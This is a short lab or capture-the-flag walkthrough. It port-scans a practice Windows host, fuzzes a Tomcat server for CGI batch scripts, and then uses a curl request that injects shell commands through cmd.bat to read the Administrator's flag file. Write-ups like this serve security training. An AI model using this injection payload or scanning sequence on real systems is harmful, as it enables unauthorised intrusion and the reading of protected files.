Did a quick nmap scan:
```
└─$ nmap 10.129.96.247
Starting Nmap 7.95 ( https://nmap.org ) at 2026-01-15 14:10 EST
Nmap scan report for 10.129.96.247
Host is up (0.070s latency).
Not shown: 990 closed tcp ports (reset)
PORT     STATE SERVICE
21/tcp   open  ftp
80/tcp   open  http
135/tcp  open  msrpc
139/tcp  open  netbios-ssn
445/tcp  open  microsoft-ds
3389/tcp open  ms-wbt-server
5985/tcp open  wsman
8000/tcp open  http-alt
8009/tcp open  ajp13
8080/tcp open  http-proxy
```

We see a tomcat instance on port 8080.

Did an enum on the tomcat server to find cgi scripts:
```
ffuf -w /usr/share/dirb/wordlists/common.txt -u http://10.129.96.247:8080/cgi/FUZZ.bat
```

We can inject commands like this:
```
curl -v 'http://10.129.96.247:8080/cgi/cmd.bat?&dir&type+C:\Users\Administrator\Desktop\flag.txt'
```

The above returns the flag

